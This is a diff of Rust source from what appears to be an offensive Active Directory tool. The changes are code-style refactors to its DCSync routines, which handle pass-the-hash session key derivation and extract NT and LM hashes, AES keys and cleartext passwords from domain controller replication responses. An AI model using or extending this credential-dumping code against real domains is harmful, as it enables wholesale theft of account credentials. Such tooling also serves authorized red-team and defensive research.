@@ -294,7 +294,7 @@ async fn pipe_transact_reassemble(
 // Credential Resolution
 // ═══════════════════════════════════════════════════════════
 
-fn resolve_credentials<'a>(config: &'a ForgeConfig) -> Result<(&'a str, &'a str, Option<Vec<u8>>)> {
+fn resolve_credentials(config: &ForgeConfig) -> Result<(&str, &str, Option<Vec<u8>>)> {
     if let Some(ref pw) = config.password {
         Ok((&config.username, pw.as_str(), None))
     } else if let Some(ref hash) = config.nt_hash {
@@ -605,15 +605,14 @@ fn compute_drs_session_key(smb_session_key: &[u8], nt_hash: &Option<Vec<u8>>) ->
     // Fallback: derive from NT hash when SMB session key is unavailable
     // (Pass-the-Hash scenario)
     // SessionBaseKey = MD4(NT_Hash) per MS-NLMP simplified
-    if let Some(hash) = nt_hash {
-        if hash.len() >= 16 {
+    if let Some(hash) = nt_hash
+        && hash.len() >= 16 {
             info!("[dcsync] Deriving session key from NT hash (PtH fallback)");
             let mut md4 = Md4::new();
             md4.update(hash);
             let derived = md4.finalize().to_vec();
             return Ok(derived);
         }
-    }
 
     Err(OverthroneError::custom(
         "No session key available — provide password or NT hash for DCSync",
@@ -641,16 +640,16 @@ fn parse_dcsync_response(resp: &[u8], session_key: &[u8], domain: &str) -> Vec<D
                     username: obj.sam_account_name.clone(),
                     domain: domain.to_string(),
                     user_rid: obj.rid.unwrap_or(0),
-                    nt_hash: obj.nt_hash.as_ref().map(hex_encode_bytes),
-                    lm_hash: obj.lm_hash.as_ref().map(hex_encode_bytes),
+                    nt_hash: obj.nt_hash.as_ref().map(|h| hex_encode_bytes(h)),
+                    lm_hash: obj.lm_hash.as_ref().map(|h| hex_encode_bytes(h)),
                     aes256_key: obj
                         .supplemental_credentials
                         .as_ref()
-                        .and_then(|s| s.aes256_key.as_ref().map(hex_encode_bytes)),
+                        .and_then(|s| s.aes256_key.as_ref().map(|h| hex_encode_bytes(h))),
                     aes128_key: obj
                         .supplemental_credentials
                         .as_ref()
-                        .and_then(|s| s.aes128_key.as_ref().map(hex_encode_bytes)),
+                        .and_then(|s| s.aes128_key.as_ref().map(|h| hex_encode_bytes(h))),
                     cleartext_password: obj
                         .supplemental_credentials
                         .as_ref()
@@ -669,7 +668,7 @@ fn parse_dcsync_response(resp: &[u8], session_key: &[u8], domain: &str) -> Vec<D
 // Helpers
 // ═══════════════════════════════════════════════════════════
 
-fn hex_encode_bytes(data: &Vec<u8>) -> String {
+fn hex_encode_bytes(data: &[u8]) -> String {
     data.iter().map(|b| format!("{:02x}", b)).collect()
 }
 
